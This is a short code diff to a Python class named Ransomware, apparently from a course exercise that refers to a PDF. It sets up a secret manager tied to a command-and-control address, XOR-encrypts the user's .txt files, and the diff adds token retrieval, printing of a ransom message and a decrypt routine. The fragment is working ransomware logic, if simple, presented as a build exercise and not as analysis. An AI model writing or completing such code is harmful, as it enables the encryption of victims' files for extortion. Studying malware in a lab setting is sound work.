@@ -61,12 +61,14 @@ class Ransomware:
         self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
         self._secret_manager.setup()
         self._secret_manager.xorfiles(self.get_files("*.txt"))
+        token = self._secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE)
         return None
         
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        self._secret_manager.xorfiles(self.get_files("*.txt"))
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
